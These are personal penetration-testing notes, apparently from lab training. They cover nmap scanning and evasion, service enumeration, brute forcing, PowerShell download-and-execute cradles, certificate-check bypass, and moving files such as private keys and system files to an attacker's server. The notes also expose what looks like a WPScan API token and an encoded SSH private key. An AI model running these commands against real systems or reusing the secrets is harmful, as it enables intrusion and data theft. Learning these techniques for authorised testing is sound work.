# Pen Test notes

## Initial Enum
### Useful Nmap Switches
- `-A` - Aggressive, does default scripts and traceroute
- `--packet-trace` - shows all packets sent and recieved
- `--reason` - shows the reason for certain results like the host is up determination
- `-Pn` - disable echo for host up
- `-F` - only do top 100 ports 
- `--stats-every=5s` - shows scan progression
- `-vv` - increase verbosity
- `--script <option>` - Uses NSE Group
  - `auth` -	Determination of authentication credentials.
  - `broadcast` -	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` -	Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` -	Default scripts executed by using the -sC option.
  - `discovery` -	Evaluation of accessible services.
  - `dos` -	These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` -	This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` -	Scripts that use external services for further processing.
  - `fuzzer` -	This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` -	Intrusive scripts that could negatively affect the target system.
  - `malware` -	Checks if some malware infects the target system.
  - `safe` -	Defensive scripts that do not perform intrusive and destructive access.
  - `version` -	Extension for service detection.
  - `vuln` -	Identification of specific vulnerabilities.  \

Nmap scripts are an important part of enumeration, so its a good idea to keep them updated using `sudo nmap --script-updatedb`, you can also search available individual nmap scripts based on your needs, an example to look for smb scripts would look like:  `find /usr/share/nmap/scripts -type f -name smb* | grep scripts`
#### Nmap Performance
Nmap can be tuned to be faster or slower to work with your network. It is importnant to understand what these flags do to know how they can help
- **RTT** - Round trip time is important because it is the ammount of time your scan will take on a single scan before assuming that there will be no response, if you set this too low you could miss hosts, but if its too high you risk wasting time, If time is on your side i would leave these as default.
  - `--initial-rtt-timeout <TIME>ms` -	Sets the specified time value as initial RTT(round trip time) timeout.
  - `--max-rtt-timeout <TIME>ms` -	Sets the specified time value as maximum RTT timeout.
- **Retries** - TCP is a conection oriented protocol and is built with the ability to retry a connection if no response is recieved, you may not want this for your purposes so you can tailor this behavior
  - `--max-retries 0` - Tells nmap not to retry failed connections
- **Rates** - Nmap also has an option to speed up scans in the form of rates, rates dictate how many packets to send at a time while timing dictates
  - `--min-rate 1000` - specifies the number of packets to send per secons
- **Timing** - These can all be a bit confusing so nmap has created timing modes that have these fields and many others set for your specific needs, they are:
  - `-T 0` / `-T paranoid`
  - `-T 1` / `-T sneaky`
  - `-T 2` / `-T polite`
  - `-T 3` / `-T normal`
  - `-T 4` / `-T aggressive`
  - `-T 5` / `-T insane`

#### Nmap Evasion
While this is not likely in a lab, you may run into a situation in a pentest in which you have to evade detection, nmap has a few switches to assist with this
- `-D RND:5`	- Generates five random IP addresses that indicates the source IP the connection comes from.
- `-S 1.1.1.1` -	Scans the target by using different source IP address (in this case 1.1.1.1).
- `-e eth0`	- Sends all requests through the specified interface.
- `--source-port 53` - Use a different Source port for scans
- `--dns-server <ns>,<ns>` - Use a different DNS server for reverse lookups
 
Heres a simple nmap script to do some host enumeration
```
#/bin/bash
read -p "Enter an IP here: " USER_IP
OPEN_PORTS=`nmap -p- --min-rate=1000 -T4 $USER_IP | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//`
nmap -p$OPEN_PORTS -sC -sV $USER_IP

```
- nmap scripts stored in ```/usr/share/nmap/scripts```
- search internal exploit db using ```searchsploit <SEARCHTERM>```
- mirror exploit to current directory using ```searchsploit -m <EXPLOIT_ID>```
### Netcat
Netcat is another useful tool for enumerating devices and connecting to applications. Netcat can be used as a simple scanner or a full on client deending on the application. 
#### Scanning
```
nc -nvz 1.1.1.1 53 #Scan server for dns port
```
- `-n` - disable reverse DNS
- `-v` - Increase Verbosity
- `-z` - Zero I/O mode, will only attempt the connection then disco
#### Connecting
```
nc -nv 1.1.1.1 23 #Connect to server via telnet
```

### OpenSSL
OpenSSL can also be used as a client to connect to different applications that nc wont work for due to being enabled
```
openssl s_client -connect 1.1.1.1:21 -starttls ftp
```


## Application Specific Enum
### FTP
Unfortunately, many FTP servers are still set up with anonymous logns enabled, to connect to a server anonymously use:
```
tnftp "ftp://anonymous:anonymous@1.1.1.1"
```
Once Connected, theres a bunch of commands that you can use to enumerate a share
- `status` - shows basic info about your connection to the FTP server 
- `debug` - makes output more verbose 
- `trace` - traces commands sent to/from the server
- `ls -R` - performs a recursive listing 
- `get <FILE>` - download a file from the server 

You can also use web technologies to connect to ftp servers, which means you can use things like `wget` to download files
- `wget -m --no-passive ftp://anonymous:anonymous@1.1.1.1` - Download all files from the ftp server

### SMB
- `smbclient -N -L //1.1.1.1`  Connecting to a smb share anonymously and listing drives
- `smbclient -U username%password //1.1.1.1/share` connect to a smbshare named "share" using "username/password"
- `rpcclient -U "username%password" 1.1.1.1`  
  - `srvinfo` 	Server information.
  - `enumdomains` 	Enumerate all domains that are deployed in the network.
  - `querydominfo` 	Provides domain, server, and user information of deployed domains.
  - `netshareenumall` 	Enumerates all available shares.
  - `netsharegetinfo` \<share\> 	Provides information about a specific share.
  - `enumdomusers` 	Enumerates all domain users.
  - `queryuser` \<RID\> 	Provides information about a specific user.

Brute forcing RIDs; This script will cycle through the RIDs for local accoints on a windows host.

`for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`
- Other Tools
  - [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py)
    - `samrdump.py 1.1.1.1`
  - [smbmap](https://github.com/ShawnDEvans/smbmap)
    - `smbmap -H 1.1.1.1`
  - [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
    - `crackmapexec smb 1.1.1.1 --shares -u '' -p ''`
  - [enum4linux](https://github.com/cddmp/enum4linux-ng)
    - `./enum4linux-ng.py 1.1.1.1 -A`
### NFS
- Show Available Mpounts
  - `showmount -e 1.1.1.1`
- Mounting NFS drive
  - `sudo mount -t nfs 1.1.1.1:/ ./target-NFS/ -o nolock`
### DNS
DNS servers can be queried via `nslookup` and `dig`
- `dig soa www.example.com`   query for start of authroity records 
- `dig www.example.com @1.1.1.1` specify name server using `@`
- `dig any www.example.com @1.1.1.1` Query any available records
- `dig axfr inlanefreight.htb @1.1.1.1` attemot zone transfer
- `dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb`

### SNMP
- `snmp-check 1.1.1.1 -c password` - Enumerates some standard keys and sprts them
- `snmpwalk -v2c -c password 1.1.1.1` - does recursive walk of OIDs
- `onesixtyone -c /usr/share/seclist/Discovery/SNMP/snmp.txt 1.1.1.1` - snmp brute forcing
  
### IMAP / POP3
`curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd`
`curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v`

You can also connect to these reources via openssl
  - POPS `openssl s_client -connect 10.129.14.128:imaps`
  - IMAPS `openssl s_client -connect 10.129.14.128:imaps`
  
### MYSQL
- `mysql -u <user> -p<password> -h <IP address>` 	Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.
- `show databases;` 	Show all databases.
- `use <database>;` 	Select one of the existing databases.
- `show tables;` 	Show all available tables in the selected database.
- `show columns from <table>;` 	Show all columns in the selected database.
- `select * from <table>;` 	Show everything in the desired table.
- `select * from <table> where <column> = "<string>";` 	Search for needed string in the desired table.

### SSH 
`git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit`\
`./ssh-audit.py 1.1.1.1`

### RDP
`git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`\
`./rdp-sec-check.pl 1.1.1.1`

`xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 /dynamic-resolution `

### WinRM
`evil-winrm -i 10.129.201.248 -u username -p password!`

### WMI
`/usr/share/doc/python3-impacket/examples/wmiexec.py username:"password"@1.1.1.1 "hostname"`

## Web
- its always safe to run a ```dirb <URL>``` to get an idea of publicly accesible URLs
  - While youre doing this since davtest doesnt support proxy you gotta edit some settings in burp id you want to view the traffic.
    - go to Options >Proxy Listeners
    - In the Bindings tab change the port to 80, and the interfact to your localhost
    - IN the Request Handling, change IP and Port to that of your target
    - Finally redo the davtest on your localhost specified in the binding tab
- another suitable alernative for dirbuster is gobuster you have to make sure to specify wordlists.
  - ```
    gobuster /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <URL> -t 20
    gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
    ```
- Nikto can be used with ```nikto -host <URL>```
- if you wee webdav open, try to ```davtest -url <URL>``` 
- Wordpress sites can be scanned with 
  ```
  wpscan --url <URL> --enumerate --api-token OLQ6ae0X6oaP5TolckVONjsTzsmh5Nz3sVNbj0JCuIY
  ```

  `pip3 install scrapy`


# Exploitation
- Python PTY Shells
  ```
  git clone https://github.com/infodox/python-pty-shells.git
  ```
- Nishang Pentest Tools
  ```
  git clone https://github.com/samratashok/nishang.git
  ```
- Powershell Empire
  ```
  git clone https://github.com/EmpireProject/Empire.git
  ```
- When trying blind remote code execution on a box the easiest way to tell if it work is by pinging yourself so on yout local box set up a pcap```tcmpdump -i <INTERFACE_NAME>```
- Remember when you FTP data, if you want to send any special media like executables specify ```binary```


## Windows
- When on target powershell enumeration can be done by using the sherlock script
  ```
  git clone https://github.com/rasta-mouse/Sherlock.git
  ```
- When using shells found in the Nishang kit make sure your handler is ```nc -lvnp <Port>```
- 64Bt binaries in windows are stored in ```C:\Windows\SysNative```
- Powershell is stored in ```C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe```
- wget and execute with powershell using INVOKE-EXPRESSION ```IEX(New-Object Net.Webclient).downloadString('<URL>')```

# Post Exploitation

## File Transfer
- https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
### Downloads
#### PowerShell Base64 Encode & Decode
- Linux Server
  ```
  #Hash File for integrity Check
  th@ddeu$ md5sum id_rsa
  4e301756a07ded0a2dd6953abf015278  id_rsa

  # Base64 the File
  cat id_rsa |base64 -w 0;echo
  LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo
  ```
- Windows Client
  ```
  PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

  PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

  Algorithm       Hash                                                                   Path
  ---------       ----                                                                   ----
  MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
  ```
#### Powershell Web Download (wget)
```
# Optimal Method  if you can download 
PS C:\> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

#If you cant download files, this will just curl the page
PS C:\> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')

# Curl and run in memory
PS C:\>  IEX (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX

# Slower traditional method
PS C:\> Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Name>'
```
Sometimes you may run into some issues downloading files this way due to certain client configurations. here are some fixes
- IE Initial Configuration not set up yet
  ```
  PS C:\> Invoke-WebRequest https://test.com/resources | IEX

  Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
  At line:1 char:1
  + Invoke-WebRequest https://test.com/r...
  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
  + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

  PS C:\> Invoke-WebRequest https://test.com/resources -UseBasicParsing | IEX
  ```
- Sometimes you may be pulling from a site with an SSL cert that isnt trusted by your client, you can bypass that with the following
  ```
  PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://test.com/resource')

  Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
  relationship for the SSL/TLS secure channel."
  At line:1 char:1
  + IEX(New-Object Net.WebClient).DownloadString('https://test.co...
  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
      + FullyQualifiedErrorId : WebException
  PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  ```
#### SMB Downloads
- Linux Server
  ```
  th@ddeu$  impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

  [*] Config file parsed
  [*] Callback added for UUID  V:3.0
  [*] Callback added for UUID  V:1.0
  [*] Config file parsed
  [*] Config file parsed
  [*] Config file parsed
  ```
- Windows Client
  ```
  net use n: \\192.168.1.1\share /user:test test
  ```
#### FTP Downloads
- Linux Server
  ```
  th@ddeu$ sudo pip3 install pyftpdlib
  sudo python3 -m pyftpdlib --port 21
  ```
- Windows Client (Powershell)
  ```
  PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://192.168.1.1/file.txt', 'C:\Users\Public\ftp-file.txt')
  ```
- Windows Client (CMD)
  ```
  C:\> echo open 192.168.49.128 > ftpcommand.txt
  C:\> echo USER anonymous >> ftpcommand.txt
  C:\> echo binary >> ftpcommand.txt
  C:\> echo GET file.txt >> ftpcommand.txt
  C:\hb> echo bye >> ftpcommand.txt
  C:\> ftp -v -n -s:ftpcommand.txt
  ftp> open 192.168.49.128
  Log in with USER and PASS first.
  ftp> USER anonymous

  ftp> GET file.txt
  ftp> bye

  C:\>more file.txt
  This is a test file
  ```
### Uploads
#### Base64 Powershell
- Windows Client
  ```
  PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

  IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
  PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

  Hash
  ----
  3688374325B992DEF12793500307566D

  ```
- Linux Server
  ```
  th@ddeu$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

  th@ddeu$ md5sum hosts 

  3688374325b992def12793500307566d  hosts
  ```
#### Powershell Web uploads
- Linux Server
  ```
  th@ddeu$ pip3 install uploadserver
  python3 -m uploadserver
  ```
- Windows Client
  ```
  PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  PS C:\> Invoke-FileUpload -Uri http://192.168.1.1:8000/upload -File C:\Windows\System32\drivers\etc\hosts

  [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
  [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
  ```
#### Powershell Base64 Web uploads
- Windows Client
  ```
  PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
  PS C:\> Invoke-WebRequest -Uri http://192.168.1.1:8000/ -Method POST -Body $b64
  ```
- Linux Server
  ```
  th@ddeu$ nc -lvnp 8000
  listening on [any] 8000 ...
  connect to [192.168.1.1] from (UNKNOWN) [192.168.1.2] 50923
  POST / HTTP/1.1
  User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
  Content-Type: application/x-www-form-urlencoded
  Host: 192.168.1.1:8000
  Content-Length: 1820
  Connection: Keep-Alive

  IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
  ...SNIP...
  th@ddeu$ echo <base64> | base64 -d -w 0 > hosts
  ```
#### SMB Upload
- Linux server
  ```
  th@ddeu$ sudo pip3 install wsgidav cheroot
  th@ddeu$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
  ``` 
- Windows Client
  ```
  C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.1.1\DavWWWRoot\
  C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.1.1\sharefolder\
  ```
#### FTP Uploads
- Linux Server
  ```
  th@ddeu$ sudo python3 -m pyftpdlib --port 21 --write
  ```
- Windows Client (Powershell)
  ```
  PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.1.1/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
  ```
- Windows Client (CMD)
  ```
  C:\> echo open 192.168.1.1> ftpcommand.txt
  C:\> echo USER anonymous >> ftpcommand.txt
  C:\> echo binary >> ftpcommand.txt
  C:\> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
  C:\> echo bye >> ftpcommand.txt
  C:\> ftp -v -n -s:ftpcommand.txt
  ftp> open 192.168.1.1

  Log in with USER and PASS first.


  ftp> USER anonymous
  ftp> PUT c:\windows\system32\drivers\etc\hosts
  ftp> bye
  ```